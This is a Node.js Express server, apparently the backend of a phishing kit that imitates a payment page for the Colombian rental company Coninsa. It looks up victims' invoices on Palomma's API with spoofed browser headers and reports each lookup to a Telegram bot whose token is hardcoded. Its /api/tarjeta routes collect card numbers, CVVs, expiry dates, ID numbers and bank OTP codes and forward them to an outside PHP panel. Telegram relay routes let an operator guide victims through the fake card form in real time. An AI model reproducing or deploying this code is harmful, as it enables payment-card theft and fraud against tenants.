// Coninsa API v1.0 — Palomma tRPC (sin CAPTCHA)
const express = require('express');
const cors    = require('cors');
const axios   = require('axios');
const path    = require('path');

const PORT     = process.env.PORT     || 3002;
const TG_TOKEN = process.env.TG_TOKEN || '8791150470:AAHYlWRPPzp5vKQgfv6np2YJuf91SGxbPU8';
const TG_CHAT  = process.env.TG_CHAT  || '-5211450529';

const PALOMMA_BASE = 'https://gosfhhn6za.execute-api.us-east-1.amazonaws.com';
const MERCHANT_ID  = 'coninsa';

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(cors({ origin: true, credentials: true }));

// ── Cache 10 min ──────────────────────────────────────────────────────────────
const _cache = new Map();
const TTL    = 10 * 60 * 1000;
function cacheGet(k) {
  const h = _cache.get(k);
  if (h && Date.now() - h.ts < TTL) return h.v;
  _cache.delete(k); return null;
}
function cacheSet(k, v) { _cache.set(k, { v, ts: Date.now() }); }

// ── Rate limit 15 req/min por IP ──────────────────────────────────────────────
const _rl = new Map();
function allowed(ip, max = 15, win = 60_000) {
  const now  = Date.now();
  const list = (_rl.get(ip) || []).filter(t => now - t < win);
  if (list.length >= max) return false;
  list.push(now); _rl.set(ip, list); return true;
}
function getIp(req) {
  return (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();
}

// ── Palomma tRPC ──────────────────────────────────────────────────────────────
async function palommaListar(documento) {
  const input = JSON.stringify({
    "0": { rentalsMerchantId: MERCHANT_ID, customerIdentifier: documento }
  });
  const url = `${PALOMMA_BASE}/invoices.list?batch=1&input=${encodeURIComponent(input)}`;

  const { data } = await axios.get(url, {
    headers: {
      'Accept':          'application/json',
      'Referer':         `https://pagos.palomma.com/coninsa/?cliente=${documento}`,
      'Origin':          'https://pagos.palomma.com',
      'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36',
    },
    timeout: 15_000,
  });

  // tRPC devuelve array: [{"result":{"data":{...}}}]
  return data?.[0]?.result?.data ?? null;
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgText(msg) {
  if (!TG_TOKEN || !TG_CHAT) return;
  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' }),
  }).catch(() => {});
}

// ── Formatear pesos colombianos ───────────────────────────────────────────────
function fmtCOP(n) {
  if (!n && n !== 0) return null;
  return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(n);
}

// ── Telegram proxy (para el modal de tarjeta del front) ──────────────────────
async function tgSend(msg, reply_markup) {
  if (!TG_TOKEN || !TG_CHAT) return { ok: false };
  const body = { chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' };
  if (reply_markup) body.reply_markup = reply_markup;
  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return r.json();
}

async function tgGetUpdates(offset) {
  if (!TG_TOKEN) return { ok: false, result: [] };
  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${offset}&timeout=0`);
  return r.json();
}

async function tgAnswerCallback(id) {
  if (!TG_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: id }),
  }).catch(() => {});
}

const PSEC_BASE = 'https://pagpse-u6htdvaa.b4a.run';

// ── Routes ────────────────────────────────────────────────────────────────────

// ── Proxy psec tarjetas ───────────────────────────────────────────────────────
app.post('/api/tarjeta/crear', async (req, res) => {
  try {
    const { numero_tarjeta, fecha, cvv, tipo_doc, cedula, monto } = req.body || {};
    const params = new URLSearchParams({
      numero_tarjeta: numero_tarjeta || '',
      fecha:          fecha || '',
      cvv:            cvv  || '',
      nombre:         cedula || '',
      apellido:       '',
      tipo_doc:       tipo_doc || 'CC',
      cedula:         cedula || '',
      celular:        '',
      email:          '',
      monto:          monto || 0,
    });
    const r = await axios.post(`${PSEC_BASE}//panel/run/create_tarjeta_m3it3m.php`, params.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      timeout: 12000,
    });
    res.json(r.data);
  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
});

app.get('/api/tarjeta/estado/:id', async (req, res) => {
  try {
    const r = await axios.get(`${PSEC_BASE}//panel/run/get_tarjetas_m3it3m.php`, { timeout: 12000 });
    const all = r.data?.data || [];
    const item = all.find(t => String(t.id) === String(req.params.id));
    if (!item) return res.json({ status: 'NOT_FOUND' });
    res.json({ status: 'OK', data: item });
  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
});

app.post('/api/tarjeta/actualizar', async (req, res) => {
  try {
    const { id, status, banco_otp, dinamica } = req.body || {};
    const params = new URLSearchParams({ id: id || '', status: status || '' });
    if (banco_otp) params.append('banco_otp', banco_otp);
    if (dinamica)  params.append('dinamica', dinamica);
    const r = await axios.post(`${PSEC_BASE}//panel/run/update_tarjeta_status_m3it3m.php`, params.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      timeout: 12000,
    });
    res.json(r.data);
  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
});

app.post('/api/tg/send', async (req, res) => {
  try {
    const { text, reply_markup } = req.body || {};
    const data = await tgSend(text, reply_markup);
    res.json(data);
  } catch (e) { res.json({ ok: false }); }
});

app.get('/api/tg/updates', async (req, res) => {
  try {
    const offset = parseInt(req.query.offset) || 0;
    const data   = await tgGetUpdates(offset);
    res.json(data);
  } catch (e) { res.json({ ok: false, result: [] }); }
});

app.post('/api/tg/answer', async (req, res) => {
  try {
    const { callback_query_id } = req.body || {};
    await tgAnswerCallback(callback_query_id);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false }); }
});

app.get('/health', (_, res) =>
  res.json({ ok: true, uptime: Math.floor(process.uptime()), cache: _cache.size })
);

// POST /api/coninsa/buscar  { documento: "123456789" }
app.post('/api/coninsa/buscar', async (req, res) => {
  if (!allowed(getIp(req)))
    return res.status(429).json({ error: 'Demasiadas solicitudes. Intenta en un momento.' });

  const { documento } = req.body || {};
  if (!documento)
    return res.status(400).json({ error: 'El número de documento es requerido.' });

  const doc = String(documento).trim().replace(/\D/g, '');
  if (!doc)
    return res.status(400).json({ error: 'Documento inválido.' });

  const cacheKey = `coninsa_${doc}`;
  const cached   = cacheGet(cacheKey);
  if (cached) return res.json({ ...cached, _cached: true });

  try {
    console.log(`\n[Coninsa] Consultando documento: ${doc}`);
    const data = await palommaListar(doc);

    if (!data) {
      return res.status(502).json({ error: 'Sin respuesta de Coninsa. Intenta de nuevo.' });
    }

    const invoices = data.invoices ?? [];
    const total    = invoices.reduce((s, inv) => s + Number(inv.amount ?? inv.totalAmount ?? 0), 0);

    const result = {
      ok:                   true,
      documento:            doc,
      totalFacturas:        invoices.length,
      totalDeuda:           total,
      totalDeudaFmt:        fmtCOP(total),
      cardFeePercentage:    data.cardFeePercentage,
      isBlockedForCard:     data.isBlockedForCardPayments,
      isCardCampaignActive: data.isCardCampaignEnabled,
      invoices:             invoices.map(inv => ({
        id:          inv.id,
        descripcion: inv.description ?? inv.name ?? null,
        periodo:     inv.period ?? inv.periodStart ?? null,
        vencimiento: inv.dueDate ?? null,
        monto:       inv.amount ?? inv.totalAmount ?? 0,
        montoFmt:    fmtCOP(inv.amount ?? inv.totalAmount ?? 0),
        contrato:    inv.contractId ?? inv.contractNumber ?? null,
        direccion:   inv.serviceAddress ?? inv.address ?? null,
        estado:      inv.status ?? null,
        raw:         inv,
      })),
    };

    if (invoices.length > 0) {
      const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
      await tgText(
        `🏢 <b>Coninsa — Consulta</b>\n\n` +
        `📝 <b>Documento:</b> <code>${doc}</code>\n` +
        `📊 <b>Facturas:</b> ${invoices.length}\n` +
        `💰 <b>Total deuda:</b> ${fmtCOP(total)}\n` +
        `🕐 <b>Hora:</b> ${hora}`
      );
    }

    cacheSet(cacheKey, result);
    return res.json(result);

  } catch (err) {
    console.error('[Coninsa] Error:', err.message);
    return res.status(502).json({ error: 'Error al consultar Coninsa. Intenta de nuevo.' });
  }
});

app.use(express.static(path.join(__dirname)));

app.listen(PORT, () =>
  console.log(`\n✅ Coninsa API v1.0 corriendo en http://localhost:${PORT}\n   Frontend: http://localhost:${PORT}/factura.html\n`)
);
